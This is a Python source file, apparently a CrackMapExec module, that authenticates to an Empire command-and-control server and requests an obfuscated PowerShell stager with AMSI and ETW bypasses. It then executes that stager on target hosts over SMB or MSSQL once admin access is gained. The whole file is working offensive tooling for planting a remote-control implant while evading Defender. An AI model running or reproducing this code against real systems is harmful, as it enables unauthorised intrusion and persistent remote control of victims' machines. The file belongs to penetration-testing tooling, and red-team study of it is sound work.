#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
from requests import ConnectionError

# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class CMEModule:
    """
    Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
    Module by @byt3bl33d3r
    """

    name = "empire_exec"
    description = "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it"
    supported_protocols = ["smb", "mssql"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        LISTENER        Listener name to generate the launcher for
        SSL             True if the listener is using SSL/TLS
        OBFUSCATE       True if you want to use the built-in Obfuscation (that calls Invoke-Obfuscate)
        OBFUSCATE_CMD   Override Invoke-Obfuscation command (Default is "Token,All,1" and is picked up by Defender)
        """
        self.empire_launcher = None

        if "LISTENER" not in module_options:
            context.log.fail("LISTENER option is required!")
            sys.exit(1)

        api_proto = "https" if "SSL" in module_options else "http"

        obfuscate = True if "OBFUSCATE" in module_options else False
        # we can use commands instead of backslashes - this is because Linux and OSX treat them differently
        default_obfuscation = "Token,All,1"
        obfuscate_cmd = module_options["OBFUSCATE_CMD"] if "OBFUSCATE_CMD" in module_options else default_obfuscation
        context.log.debug(f"Obfuscate: {obfuscate} - Obfuscate_cmd: {obfuscate_cmd}")

        # Pull the host and port from the config file
        base_url = f"{api_proto}://{context.conf.get('Empire', 'api_host')}:{context.conf.get('Empire', 'api_port')}"
        context.log.debug(f"Empire URL: {base_url}")

        # Pull the username and password from the config file
        empire_creds = {
            "username": context.conf.get("Empire", "username"),
            "password": context.conf.get("Empire", "password"),
        }
        context.log.debug(f"Empire Creds: {empire_creds}")

        try:
            login_response = requests.post(
                f"{base_url}/token",
                data=empire_creds,
                verify=False,
            )
        except ConnectionError as e:
            context.log.fail(f"Unable to login to Empire's RESTful API: {e}")
            sys.exit(1)
        context.log.debug(f"Response Code: {login_response.status_code}")
        context.log.debug(f"Response Content: {login_response.text}")

        if login_response.status_code == 200:
            access_token = login_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {access_token}"}
        else:
            context.log.fail("Error authenticating to Empire's RESTful API")
            sys.exit(1)

        data = {
            "name": "cme_ephemeral",
            "template": "multi_launcher",
            "options": {
                "Listener": module_options["LISTENER"],
                "Language": "powershell",
                "StagerRetries": "0",
                "OutFile": "",
                "Base64": "True",
                "Obfuscate": obfuscate,
                "ObfuscateCommand": obfuscate_cmd,
                "SafeChecks": "True",
                "UserAgent": "default",
                "Proxy": "default",
                "ProxyCreds": "default",
                "Bypasses": "mattifestation etw",
            },
        }
        try:
            stager_response = requests.post(
                f"{base_url}/api/v2/stagers?save=False",
                json=data,
                headers=headers,
                verify=False,
            )
        except ConnectionError:
            context.log.fail(f"Unable to request stager from Empire's RESTful API")
            sys.exit(1)

        if stager_response.status_code not in [200, 201]:
            if "not found" in stager_response.json()["detail"]:
                context.log.fail(f"Listener {module_options['LISTENER']} not found")
            else:
                context.log.fail(f"Stager response received a non-200 when creating stager: {stager_response.status_code} {stager_response.text}")
            sys.exit(1)

        context.log.debug(f"Response Code: {stager_response.status_code}")
        # context.log.debug(f"Response Content: {stager_response.text}")

        stager_create_data = stager_response.json()
        context.log.debug(f"Stager data: {stager_create_data}")
        download_uri = stager_create_data["downloads"][0]["link"]

        download_response = requests.get(
            f"{base_url}{download_uri}",
            headers=headers,
            verify=False,
        )
        context.log.debug(f"Response Code: {download_response.status_code}")
        # context.log.debug(f"Response Content: {download_response.text}")

        self.empire_launcher = download_response.text

        if download_response.status_code == 200:
            context.log.success(f"Successfully generated launcher for listener '{module_options['LISTENER']}'")
        else:
            context.log.fail(f"Something went wrong when retrieving stager Powershell command")

    def on_admin_login(self, context, connection):
        if self.empire_launcher:
            connection.execute(self.empire_launcher)
            context.log.success("Executed Empire Launcher")
